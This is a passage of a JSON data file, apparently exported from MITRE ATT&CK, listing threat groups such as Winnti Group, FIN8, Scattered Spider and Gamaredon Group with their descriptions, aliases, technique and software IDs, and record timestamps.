      "modified": "2024-11-17T14:57:09.164000+00:00"
    },
    "G0044": {
      "id": "G0044",
      "name": "Winnti Group",
      "description": "[Winnti Group](https://attack.mitre.org/groups/G0044) is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting.(Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015)(Citation: Novetta Winnti April 2015) Some reporting suggests a number of other groups, including [Axiom](https://attack.mitre.org/groups/G0001), [APT17](https://attack.mitre.org/groups/G0025), and [Ke3chang](https://attack.mitre.org/groups/G0004), are closely linked to [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: 401 TRG Winnti Umbrella May 2018)",
      "aliases": [
        "Winnti Group",
        "Blackfly"
      ],
      "techniques": [
        "T1014",
        "T1105",
        "T1083",
        "T1583.001",
        "T1057",
        "T1553.002"
      ],
      "software": [
        "S0501",
        "S0141",
        "S0013"
      ],
      "url": "https://attack.mitre.org/groups/G0044",
      "stix_id": "intrusion-set--c5947e1c-1cbc-434c-94b8-27c7e3be0fff",
      "created": "2017-05-31T21:32:08.682000+00:00",
      "modified": "2025-04-16T20:37:35.689000+00:00"
    },
    "G0061": {
      "id": "G0061",
      "name": "FIN8",
      "description": "[FIN8](https://attack.mitre.org/groups/G0061) is a financially motivated threat group that has been active since at least January 2016, and known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemical, and financial sectors. In June 2021, security researchers detected [FIN8](https://attack.mitre.org/groups/G0061) switching from targeting point-of-sale (POS) devices to distributing a number of ransomware variants.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Fin8 May 2016)(Citation: Bitdefender Sardonic Aug 2021)(Citation: Symantec FIN8 Jul 2023)",
      "aliases": [
        "FIN8",
        "Syssphinx"
      ],
      "techniques": [
        "T1078",
        "T1070.001",
        "T1048.003",
        "T1033",
        "T1518.001",
        "T1021.001",
        "T1003.001",
        "T1588.002",
        "T1204.002",
        "T1588.003",
        "T1068",
        "T1546.003",
        "T1566.002",
        "T1053.005",
        "T1204.001",
        "T1102",
        "T1027.010",
        "T1070.004",
        "T1566.001",
        "T1071.001",
        "T1021.002",
        "T1560.001",
        "T1074.002",
        "T1105",
        "T1082",
        "T1059.001",
        "T1059.003",
        "T1573.002",
        "T1055.004",
        "T1018",
        "T1486",
        "T1482",
        "T1112",
        "T1134.001",
        "T1016.001",
        "T1047"
      ],
      "software": [
        "S0097",
        "S0105",
        "S0039",
        "S0359",
        "S0029",
        "S0357",
        "S1081",
        "S0196",
        "S0481",
        "S0197",
        "S1085"
      ],
      "url": "https://attack.mitre.org/groups/G0061",
      "stix_id": "intrusion-set--fd19bd82-1b14-49a1-a176-6cdc46b8a826",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:37:35.846000+00:00"
    },
    "G0106": {
      "id": "G0106",
      "name": "Rocke",
      "description": "[Rocke](https://attack.mitre.org/groups/G0106) is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name [Rocke](https://attack.mitre.org/groups/G0106) comes from the email address \"rocke@live.cn\" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between [Rocke](https://attack.mitre.org/groups/G0106) and the Iron Cybercrime Group, though this attribution has not been confirmed.(Citation: Talos Rocke August 2018)",
      "aliases": [
        "Rocke"
      ],
      "techniques": [
        "T1190",
        "T1014",
        "T1027",
        "T1102",
        "T1562.004",
        "T1059.004",
        "T1082",
        "T1071",
        "T1105",
        "T1496.001",
        "T1027.004",
        "T1574.006",
        "T1564.001",
        "T1053.003",
        "T1059.006",
        "T1046",
        "T1055.002",
        "T1102.001",
        "T1037",
        "T1027.002",
        "T1070.002",
        "T1547.001",
        "T1222.002",
        "T1057",
        "T1543.002",
        "T1018",
        "T1140",
        "T1562.001",
        "T1552.004",
        "T1070.004",
        "T1071.001",
        "T1571",
        "T1021.004",
        "T1070.006",
        "T1036.005",
        "T1518.001"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0106",
      "stix_id": "intrusion-set--44102191-3a31-45f8-acbe-34bdb441d5ad",
      "created": "2020-05-26T14:20:20.623000+00:00",
      "modified": "2025-04-25T14:49:08.821000+00:00"
    },
    "G1042": {
      "id": "G1042",
      "name": "RedEcho",
      "description": "[RedEcho](https://attack.mitre.org/groups/G1042) is a People\u2019s Republic of China-related threat actor associated with long-running intrusions in Indian critical infrastructure entities. [RedEcho](https://attack.mitre.org/groups/G1042) overlaps with various other PRC-linked threat groups, such as [APT41](https://attack.mitre.org/groups/G0096), and is linked to [ShadowPad](https://attack.mitre.org/software/S0596) malware use through shared infrastructure.(Citation: RecordedFuture RedEcho 2021)(Citation: RecordedFuture RedEcho 2022)",
      "aliases": [
        "RedEcho"
      ],
      "techniques": [
        "T1568",
        "T1071.001",
        "T1571",
        "T1573.002",
        "T1583.001"
      ],
      "software": [
        "S0596"
      ],
      "url": "https://attack.mitre.org/groups/G1042",
      "stix_id": "intrusion-set--2c40f629-6cf9-4f75-af32-9a98caec24ae",
      "created": "2024-11-21T22:34:30.327000+00:00",
      "modified": "2025-03-13T20:54:46.475000+00:00"
    },
    "G1031": {
      "id": "G1031",
      "name": "Saint Bear",
      "description": "[Saint Bear](https://attack.mitre.org/groups/G1031) is a Russian-nexus threat actor active since early 2021, primarily targeting entities in Ukraine and Georgia. The group is notable for a specific remote access tool, [Saint Bot](https://attack.mitre.org/software/S1018), and information stealer, [OutSteel](https://attack.mitre.org/software/S1017) in campaigns. [Saint Bear](https://attack.mitre.org/groups/G1031) typically relies on phishing or web staging of malicious documents and related file types for initial access, spoofing government or related entities.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )(Citation: Cadet Blizzard emerges as novel threat actor) [Saint Bear](https://attack.mitre.org/groups/G1031) has previously been confused with [Ember Bear](https://attack.mitre.org/groups/G1003) operations, but analysis of behaviors, tools, and targeting indicates these are distinct clusters.",
      "aliases": [
        "Saint Bear",
        "Storm-0587",
        "TA471",
        "UAC-0056",
        "Lorec53"
      ],
      "techniques": [
        "T1566.001",
        "T1203",
        "T1059.007",
        "T1589.002",
        "T1497",
        "T1059.003",
        "T1553.002",
        "T1204.001",
        "T1027.013",
        "T1656",
        "T1059.001",
        "T1204.002",
        "T1059",
        "T1583.006",
        "T1608.001",
        "T1562.001",
        "T1027.002",
        "T1112"
      ],
      "software": [
        "S1017",
        "S1018"
      ],
      "url": "https://attack.mitre.org/groups/G1031",
      "stix_id": "intrusion-set--674582ec-51c4-42ce-b409-797239e37a2a",
      "created": "2024-05-25T16:11:54.881000+00:00",
      "modified": "2024-08-12T17:32:47.430000+00:00"
    },
    "G1015": {
      "id": "G1015",
      "name": "Scattered Spider",
      "description": "[Scattered Spider](https://attack.mitre.org/groups/G1015) is a native English-speaking cybercriminal group that has been active since at least 2022.(Citation: CrowdStrike Scattered Spider Profile)(Citation: MSTIC Octo Tempest Operations October 2023) The group initially targeted customer relationship management and business-process outsourcing (BPO) firms as well as telecommunications and technology companies. Beginning in 2023, [Scattered Spider](https://attack.mitre.org/groups/G1015) expanded its operations to compromise victims in the gaming, hospitality, retail, MSP, manufacturing, and financial sectors.(Citation: MSTIC Octo Tempest Operations October 2023) During campaigns, [Scattered Spider](https://attack.mitre.org/groups/G1015) has leveraged targeted social-engineering techniques, attempted to bypass popular endpoint security tools, and more recently, deployed ransomware for financial gain.(Citation: CISA Scattered Spider Advisory November 2023)(Citation: CrowdStrike Scattered Spider BYOVD January 2023)(Citation: CrowdStrike Scattered Spider Profile)(Citation: MSTIC Octo Tempest Operations October 2023)(Citation: Crowdstrike TELCO BPO Campaign December 2022)",
      "aliases": [
        "Scattered Spider",
        "Roasted 0ktapus",
        "Octo Tempest",
        "Storm-0875"
      ],
      "techniques": [
        "T1598",
        "T1553.002",
        "T1556.009",
        "T1580",
        "T1003.003",
        "T1087.002",
        "T1484.002",
        "T1564.008",
        "T1539",
        "T1552.004",
        "T1538",
        "T1486",
        "T1133",
        "T1204",
        "T1556.006",
        "T1083",
        "T1219",
        "T1657",
        "T1213.003",
        "T1098.003",
        "T1621",
        "T1213.005",
        "T1068",
        "T1530",
        "T1217",
        "T1006",
        "T1136",
        "T1018",
        "T1567.002",
        "T1598.004",
        "T1074",
        "T1021.007",
        "T1578.002",
        "T1552.001",
        "T1114",
        "T1656",
        "T1572",
        "T1190",
        "T1087.004",
        "T1102",
        "T1069.003",
        "T1598.004",
        "T1003.006",
        "T1105",
        "T1098.003",
        "T1578.002",
        "T1046",
        "T1021.007",
        "T1213.002",
        "T1078.004",
        "T1087.003",
        "T1598.001",
        "T1621",
        "T1098.005",
        "T1219",
        "T1047",
        "T1656",
        "T1098.001",
        "T1133",
        "T1530",
        "T1588.002",
        "T1589.001",
        "T1090",
        "T1566.004"
      ],
      "software": [
        "S0349",
        "S0002",
        "S0508",
        "S0670",
        "S1068",
        "S0357"
      ],
      "url": "https://attack.mitre.org/groups/G1015",
      "stix_id": "intrusion-set--44d37b89-a739-4810-9111-0d2617a8939b",
      "created": "2023-07-05T17:54:54.789000+00:00",
      "modified": "2024-04-04T21:24:48.602000+00:00"
    },
    "G1012": {
      "id": "G1012",
      "name": "CURIUM",
      "description": "[CURIUM](https://attack.mitre.org/groups/G1012) is an Iranian threat group, first reported in September 2019 and active since at least July 2018, targeting IT service providers in the Middle East.(Citation: Symantec Tortoiseshell 2019) [CURIUM](https://attack.mitre.org/groups/G1012) has since invested in building relationships with potential targets via social media over a period of months to establish trust and confidence before sending malware. Security researchers note [CURIUM](https://attack.mitre.org/groups/G1012) has demonstrated great patience and persistence by chatting with potential targets daily and sending benign files to help lower their security consciousness.(Citation: Microsoft Iranian Threat Actor Trends November 2021)",
      "aliases": [
        "CURIUM",
        "Crimson Sandstorm",
        "TA456",
        "Tortoise Shell",
        "Yellow Liderc"
      ],
      "techniques": [
        "T1566.003",
        "T1505.003",
        "T1204.002",
        "T1584.006",
        "T1583.003",
        "T1082",
        "T1608.004",
        "T1048.002",
        "T1005",
        "T1585.001",
        "T1585.002",
        "T1124",
        "T1598.003",
        "T1189",
        "T1566.001",
        "T1059.001",
        "T1583.001",
        "T1041",
        "T1583.004"
      ],
      "software": [
        "S1152"
      ],
      "url": "https://attack.mitre.org/groups/G1012",
      "stix_id": "intrusion-set--3ea7add5-5b8f-45d8-b1f1-905d2729d62a",
      "created": "2023-01-13T20:51:13.494000+00:00",
      "modified": "2024-10-02T12:13:42.278000+00:00"
    },
    "G0124": {
      "id": "G0124",
      "name": "Windigo",
      "description": "The [Windigo](https://attack.mitre.org/groups/G0124) group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the [Ebury](https://attack.mitre.org/software/S0377) SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, [Windigo](https://attack.mitre.org/groups/G0124) operators continued updating [Ebury](https://attack.mitre.org/software/S0377) through 2019.(Citation: ESET Windigo Mar 2014)(Citation: CERN Windigo June 2019)",
      "aliases": [
        "Windigo"
      ],
      "techniques": [
        "T1082",
        "T1005",
        "T1518",
        "T1090",
        "T1059",
        "T1083",
        "T1189"
      ],
      "software": [
        "S0377"
      ],
      "url": "https://attack.mitre.org/groups/G0124",
      "stix_id": "intrusion-set--4e868dad-682d-4897-b8df-2dc98f46c68a",
      "created": "2021-02-10T19:57:38.042000+00:00",
      "modified": "2025-04-25T14:49:09.909000+00:00"
    },
    "G0108": {
      "id": "G0108",
      "name": "Blue Mockingbird",
      "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.(Citation: RedCanary Mockingbird May 2020)",
      "aliases": [
        "Blue Mockingbird"
      ],
      "techniques": [
        "T1059.001",
        "T1574.012",
        "T1546.003",
        "T1082",
        "T1543.003",
        "T1053.005",
        "T1090",
        "T1047",
        "T1059.003",
        "T1003.001",
        "T1218.011",
        "T1134",
        "T1496.001",
        "T1027.013",
        "T1112",
        "T1569.002",
        "T1190",
        "T1021.001",
        "T1218.010",
        "T1021.002",
        "T1036.005",
        "T1588.002"
      ],
      "software": [
        "S1144",
        "S0002"
      ],
      "url": "https://attack.mitre.org/groups/G0108",
      "stix_id": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
      "created": "2020-05-26T20:09:39.139000+00:00",
      "modified": "2024-07-10T18:53:44.277000+00:00"
    },
    "G1039": {
      "id": "G1039",
      "name": "RedCurl",
      "description": "[RedCurl](https://attack.mitre.org/groups/G1039) is a threat actor active since 2018 notable for corporate espionage targeting a variety of locations, including Ukraine, Canada and the United Kingdom, and a variety of industries, including but not limited to travel agencies, insurance companies, and banks.(Citation: group-ib_redcurl1) [RedCurl](https://attack.mitre.org/groups/G1039) is allegedly a Russian-speaking threat actor.(Citation: group-ib_redcurl1)(Citation: group-ib_redcurl2) The group\u2019s operations typically start with spearphishing emails to gain initial access, then the group executes discovery and collection commands and scripts to find corporate data. The group concludes operations by exfiltrating files to the C2 servers. ",
      "aliases": [
        "RedCurl"
      ],
      "techniques": [
        "T1027",
        "T1564.001",
        "T1102",
        "T1114.001",
        "T1039",
        "T1080",
        "T1204.002",
        "T1005",
        "T1119",
        "T1083",
        "T1059.003",
        "T1059.001",
        "T1036.005",
        "T1566.001",
        "T1059.005",
        "T1560.001",
        "T1573.001",
        "T1071.001",
        "T1087.003",
        "T1587.001",
        "T1087.001",
        "T1056.002",
        "T1082",
        "T1204.001",
        "T1573.002",
        "T1053.005",
        "T1020",
        "T1199",
        "T1537",
        "T1202",
        "T1552.001",
        "T1218.011",
        "T1087.002",
        "T1566.002",
        "T1552.002",
        "T1070.004",
        "T1547.001",
        "T1555.003",
        "T1059.006",
        "T1003.001",
        "T1046"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G1039",
      "stix_id": "intrusion-set--82323c70-4186-4b61-94f5-b227c3b28e89",
      "created": "2024-09-23T21:32:19.337000+00:00",
      "modified": "2024-09-23T23:11:00.562000+00:00"
    },
    "G0085": {
      "id": "G0085",
      "name": "FIN4",
      "description": "[FIN4](https://attack.mitre.org/groups/G0085) is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye FIN4 Stealing Insider NOV 2014) [FIN4](https://attack.mitre.org/groups/G0085) is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014)",
      "aliases": [
        "FIN4"
      ],
      "techniques": [
        "T1078",
        "T1059.005",
        "T1090.003",
        "T1204.002",
        "T1564.008",
        "T1204.001",
        "T1056.001",
        "T1056.002",
        "T1566.002",
        "T1566.001",
        "T1071.001",
        "T1114.002"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0085",
      "stix_id": "intrusion-set--d0b3393b-3bec-4ba3-bda9-199d30db47b6",
      "created": "2019-01-31T02:01:45.129000+00:00",
      "modified": "2024-11-17T15:57:47.485000+00:00"
    },
    "G0078": {
      "id": "G0078",
      "name": "Gorgon Group",
      "description": "[Gorgon Group](https://attack.mitre.org/groups/G0078) is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. (Citation: Unit 42 Gorgon Group Aug 2018)",
      "aliases": [
        "Gorgon Group"
      ],
      "techniques": [
        "T1055.012",
        "T1140",
        "T1106",
        "T1547.001",
        "T1059.001",
        "T1059.003",
        "T1105",
        "T1566.001",
        "T1564.003",
        "T1055.002",
        "T1562.001",
        "T1112",
        "T1547.009",
        "T1204.002",
        "T1588.002",
        "T1059.005"
      ],
      "software": [
        "S0262",
        "S0332",
        "S0336",
        "S0385"
      ],
      "url": "https://attack.mitre.org/groups/G0078",
      "stix_id": "intrusion-set--1f21da59-6a13-455b-afd0-d58d0a5a7d27",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:49:11.522000+00:00"
    },
    "G0121": {
      "id": "G0121",
      "name": "Sidewinder",
      "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.(Citation: ATT Sidewinder January 2021)(Citation: Securelist APT Trends April 2018)(Citation: Cyble Sidewinder September 2020)",
      "aliases": [
        "Sidewinder",
        "T-APT-04",
        "Rattlesnake"
      ],
      "techniques": [
        "T1203",
        "T1518.001",
        "T1218.005",
        "T1598.003",
        "T1124",
        "T1566.002",
        "T1074.001",
        "T1057",
        "T1059.007",
        "T1027.013",
        "T1020",
        "T1105",
        "T1547.001",
        "T1071.001",
        "T1559.002",
        "T1083",
        "T1016",
        "T1598.002",
        "T1027.010",
        "T1059.001",
        "T1518",
        "T1059.005",
        "T1082",
        "T1119",
        "T1566.001",
        "T1036.005",
        "T1204.001",
        "T1204.002",
        "T1033",
        "T1574.001"
      ],
      "software": [
        "S0250"
      ],
      "url": "https://attack.mitre.org/groups/G0121",
      "stix_id": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
      "created": "2021-01-27T15:57:11.183000+00:00",
      "modified": "2024-04-11T00:07:05.918000+00:00"
    },
    "G0126": {
      "id": "G0126",
      "name": "Higaisa",
      "description": "[Higaisa](https://attack.mitre.org/groups/G0126) is a threat group suspected to have South Korean origins. [Higaisa](https://attack.mitre.org/groups/G0126) has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. [Higaisa](https://attack.mitre.org/groups/G0126) was first disclosed in early 2019 but is assessed to have operated as early as 2009.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)",
      "aliases": [
        "Higaisa"
      ],
      "techniques": [
        "T1059.005",
        "T1106",
        "T1041",
        "T1574.001",
        "T1124",
        "T1090.001",
        "T1204.002",
        "T1027.013",
        "T1053.005",
        "T1082",
        "T1566.001",
        "T1071.001",
        "T1001.003",
        "T1203",
        "T1029",
        "T1059.007",
        "T1027.001",
        "T1027.015",
        "T1220",
        "T1564.003",
        "T1573.001",
        "T1547.001",
        "T1057",
        "T1036.004",
        "T1016",
        "T1059.003",
        "T1140"
      ],
      "software": [
        "S0160",
        "S0013",
        "S0032"
      ],
      "url": "https://attack.mitre.org/groups/G0126",
      "stix_id": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
      "created": "2021-03-05T18:54:56.267000+00:00",
      "modified": "2024-04-11T02:19:20.934000+00:00"
    },
    "G0013": {
      "id": "G0013",
      "name": "APT30",
      "description": "[APT30](https://attack.mitre.org/groups/G0013) is a threat group suspected to be associated with the Chinese government. While [Naikon](https://attack.mitre.org/groups/G0019) shares some characteristics with [APT30](https://attack.mitre.org/groups/G0013), the two groups do not appear to be exact matches.(Citation: FireEye APT30)(Citation: Baumgartner Golovkin Naikon 2015)",
      "aliases": [
        "APT30"
      ],
      "techniques": [
        "T1566.001",
        "T1204.002"
      ],
      "software": [
        "S0028",
        "S0031",
        "S0036",
        "S0034",
        "S0035"
      ],
      "url": "https://attack.mitre.org/groups/G0013",
      "stix_id": "intrusion-set--f047ee18-7985-4946-8bfb-4ed754d3a0dd",
      "created": "2017-05-31T21:31:51.026000+00:00",
      "modified": "2024-11-17T15:05:25.104000+00:00"
    },
    "G0112": {
      "id": "G0112",
      "name": "Windshift",
      "description": "[Windshift](https://attack.mitre.org/groups/G0112) is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)",
      "aliases": [
        "Windshift",
        "Bahamut"
      ],
      "techniques": [
        "T1057",
        "T1189",
        "T1059.005",
        "T1518.001",
        "T1566.001",
        "T1204.001",
        "T1566.003",
        "T1547.001",
        "T1518",
        "T1566.002",
        "T1036.001",
        "T1027",
        "T1071.001",
        "T1036",
        "T1105",
        "T1047",
        "T1033",
        "T1082",
        "T1204.002"
      ],
      "software": [
        "S0466"
      ],
      "url": "https://attack.mitre.org/groups/G0112",
      "stix_id": "intrusion-set--afec6dc3-a18e-4b62-b1a4-5510e1a498d1",
      "created": "2020-06-25T17:16:39.168000+00:00",
      "modified": "2024-11-17T14:15:51.850000+00:00"
    },
    "G0142": {
      "id": "G0142",
      "name": "Confucius",
      "description": "[Confucius](https://attack.mitre.org/groups/G0142) is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013. Security researchers have noted similarities between [Confucius](https://attack.mitre.org/groups/G0142) and [Patchwork](https://attack.mitre.org/groups/G0040), particularly in their respective custom malware code and targets.(Citation: TrendMicro Confucius APT Feb 2018)(Citation: TrendMicro Confucius APT Aug 2021)(Citation: Uptycs Confucius APT Jan 2021)",
      "aliases": [
        "Confucius",
        "Confucius APT"
      ],
      "techniques": [
        "T1566.002",
        "T1204.001",
        "T1567.002",
        "T1221",
        "T1059.005",
        "T1566.001",
        "T1203",
        "T1082",
        "T1105",
        "T1119",
        "T1583.006",
        "T1071.001",
        "T1041",
        "T1218.005",
        "T1083",
        "T1547.001",
        "T1053.005",
        "T1204.002",
        "T1059.001"
      ],
      "software": [
        "S0670"
      ],
      "url": "https://attack.mitre.org/groups/G0142",
      "stix_id": "intrusion-set--6eded342-33e5-4451-b6b2-e1c62863129f",
      "created": "2021-12-26T23:11:39.442000+00:00",
      "modified": "2025-04-16T20:37:36.476000+00:00"
    },
    "G1043": {
      "id": "G1043",
      "name": "BlackByte",
      "description": "[BlackByte](https://attack.mitre.org/groups/G1043) is a ransomware threat actor operating since at least 2021. [BlackByte](https://attack.mitre.org/groups/G1043) is associated with several versions of ransomware also labeled [BlackByte Ransomware](https://attack.mitre.org/software/S1180). [BlackByte](https://attack.mitre.org/groups/G1043) ransomware operations initially used a common encryption key allowing for the development of a universal decryptor, but subsequent versions such as [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) use more robust encryption mechanisms. [BlackByte](https://attack.mitre.org/groups/G1043) is notable for operations targeting critical infrastructure entities among other targets across North America.(Citation: FBI BlackByte 2022)(Citation: Picus BlackByte 2022)(Citation: Symantec BlackByte 2022)(Citation: Microsoft BlackByte 2023)(Citation: Cisco BlackByte 2024)",
      "aliases": [
        "BlackByte",
        "Hecamede"
      ],
      "techniques": [
        "T1082",
        "T1016",
        "T1046",
        "T1105",
        "T1482",
        "T1036.008",
        "T1053.005",
        "T1134.003",
        "T1070.004",
        "T1543.003",
        "T1021.001",
        "T1614.001",
        "T1560",
        "T1059.003",
        "T1136.002",
        "T1112",
        "T1055.012",
        "T1491.001",
        "T1071.001",
        "T1087.002",
        "T1570",
        "T1583.003",
        "T1190",
        "T1608.001",
        "T1562",
        "T1490",
        "T1012",
        "T1059.001",
        "T1041",
        "T1003",
        "T1569.002",
        "T1135",
        "T1140",
        "T1068",
        "T1562.001",
        "T1505.003",
        "T1078",
        "T1567",
        "T1055",
        "T1021.002",
        "T1078.002",
        "T1547.001",
        "T1480",
        "T1486",
        "T1518.001",
        "T1219",
        "T1047",
        "T1018",
        "T1562.004"
      ],
      "software": [
        "S0552",
        "S0099",
        "S0029",
        "S0002",
        "S1180",
        "S1179",
        "S1181",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G1043",
      "stix_id": "intrusion-set--02b16bd6-ae88-417a-8a3f-02c5e166175a",
      "created": "2024-12-16T23:19:40.207000+00:00",
      "modified": "2025-03-09T15:58:36.918000+00:00"
    },
    "G0027": {
      "id": "G0027",
      "name": "Threat Group-3390",
      "description": "[Threat Group-3390](https://attack.mitre.org/groups/G0027) is a Chinese threat group that has extensively used strategic Web compromises to target victims.(Citation: Dell TG-3390) The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Securelist LuckyMouse June 2018)(Citation: Trend Micro DRBControl February 2020)",
      "aliases": [
        "Threat Group-3390",
        "Earth Smilodon",
        "TG-3390",
        "Emissary Panda",
        "BRONZE UNION",
        "APT27",
        "Iron Tiger",
        "LuckyMouse"
      ],
      "techniques": [
        "T1068",
        "T1030",
        "T1190",
        "T1046",
        "T1053.002",
        "T1055.012",
        "T1074.001",
        "T1203",
        "T1567.002",
        "T1003.001",
        "T1059.003",
        "T1555.005",
        "T1566.001",
        "T1012",
        "T1003.004",
        "T1027.015",
        "T1204.002",
        "T1033",
        "T1608.001",
        "T1505.003",
        "T1547.001",
        "T1027.013",
        "T1543.003",
        "T1199",
        "T1016",
        "T1105",
        "T1056.001",
        "T1059.001",
        "T1562.002",
        "T1078",
        "T1608.004",
        "T1588.002",
        "T1018",
        "T1583.001",
        "T1189",
        "T1140",
        "T1003.002",
        "T1133",
        "T1005",
        "T1087.001",
        "T1195.002",
        "T1548.002",
        "T1119",
        "T1560.002",
        "T1027.002",
        "T1588.003",
        "T1047",
        "T1071.001",
        "T1070.005",
        "T1021.006",
        "T1574.001",
        "T1070.004",
        "T1608.002",
        "T1112",
        "T1210",
        "T1074.002",
        "T1049"
      ],
      "software": [
        "S0039",
        "S0096",
        "S0008",
        "S0002",
        "S0357",
        "S0160",
        "S0057",
        "S0104",
        "S0100",
        "S0006",
        "S0590",
        "S0005",
        "S0013",
        "S0073",
        "S0154",
        "S0032",
        "S0020",
        "S0070",
        "S0663",
        "S0398",
        "S0412",
        "S0662",
        "S0660",
        "S0664"
      ],
      "url": "https://attack.mitre.org/groups/G0027",
      "stix_id": "intrusion-set--fb366179-766c-4a4a-afa1-52bff1fd601c",
      "created": "2017-05-31T21:31:58.518000+00:00",
      "modified": "2024-04-10T22:33:06.500000+00:00"
    },
    "G0131": {
      "id": "G0131",
      "name": "Tonto Team",
      "description": "[Tonto Team](https://attack.mitre.org/groups/G0131) is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they expanded operations to include other Asian as well as Eastern European countries. [Tonto Team](https://attack.mitre.org/groups/G0131) has targeted government, military, energy, mining, financial, education, healthcare, and technology organizations, including through the Heartbeat Campaign (2009-2012) and Operation Bitter Biscuit (2017).(Citation: Kaspersky CactusPete Aug 2020)(Citation: ESET Exchange Mar 2021)(Citation: FireEye Chinese Espionage October 2019)(Citation: ARS Technica China Hack SK April 2017)(Citation: Trend Micro HeartBeat Campaign January 2013)(Citation: Talos Bisonal 10 Years March 2020)",
      "aliases": [
        "Tonto Team",
        "Earth Akhlut",
        "BRONZE HUNTLEY",
        "CactusPete",
        "Karma Panda"
      ],
      "techniques": [
        "T1135",
        "T1574.001",
        "T1090.002",
        "T1059.006",
        "T1069.001",
        "T1056.001",
        "T1003",
        "T1505.003",
        "T1203",
        "T1204.002",
        "T1566.001",
        "T1210",
        "T1059.001",
        "T1068",
        "T1105"
      ],
      "software": [
        "S0002",
        "S0349",
        "S0590",
        "S0008",
        "S0268",
        "S0596"
      ],
      "url": "https://attack.mitre.org/groups/G0131",
      "stix_id": "intrusion-set--c5b81590-6814-4d2a-8baa-15c4b6c7f960",
      "created": "2021-05-05T17:18:25.987000+00:00",
      "modified": "2024-11-17T16:30:03.375000+00:00"
    },
    "G0047": {
      "id": "G0047",
      "name": "Gamaredon Group",
      "description": "[Gamaredon Group](https://attack.mitre.org/groups/G0047) is a suspected Russian cyber espionage threat group that has targeted military, NGO, judiciary, law enforcement, and non-profit organizations in Ukraine since at least 2013. The name [Gamaredon Group](https://attack.mitre.org/groups/G0047) comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: Microsoft Actinium February 2022)\n\nIn November 2021, the Ukrainian government publicly attributed [Gamaredon Group](https://attack.mitre.org/groups/G0047) to Russia's Federal Security Service (FSB) Center 18.(Citation: Bleepingcomputer Gamardeon FSB November 2021)(Citation: Microsoft Actinium February 2022)",
      "aliases": [
        "Gamaredon Group",
        "IRON TILDEN",
        "Primitive Bear",
        "ACTINIUM",
        "Armageddon",
        "Shuckworm",
        "DEV-0157",
        "Aqua Blizzard"
      ],
      "techniques": [
        "T1491.001",
        "T1583.003",
        "T1001",
        "T1534",
        "T1047",
        "T1083",
        "T1119",
        "T1036.005",
        "T1027.004",
        "T1105",
        "T1021.005",
        "T1027.016",
        "T1218.011",
        "T1566.001",
        "T1082",
        "T1059.005",
        "T1113",
        "T1005",
        "T1039",
        "T1608.001",
        "T1102.003",
        "T1112",
        "T1016.001",
        "T1559.001",
        "T1562.001",
        "T1025",
        "T1221",
        "T1140",
        "T1204.001",
        "T1080",
        "T1106",
        "T1561.001",
        "T1033",
        "T1564.003",
        "T1070.004",
        "T1059.001",
        "T1588.002",
        "T1020",
        "T1071.001",
        "T1583.001",
        "T1568.001",
        "T1120",
        "T1041",
        "T1053.005",
        "T1027",
        "T1057",
        "T1027.010",
        "T1204.002",
        "T1568",
        "T1547.001",
        "T1480",
        "T1059.003",
        "T1218.005",
        "T1137",
        "T1102"
      ],
      "software": [
        "S0097",
        "S0075",
        "S0686",
        "S0147",
        "S0685"
      ],
      "url": "https://attack.mitre.org/groups/G0047",
      "stix_id": "intrusion-set--2e290bfe-93b5-48ce-97d6-edcd6d32b7cf",
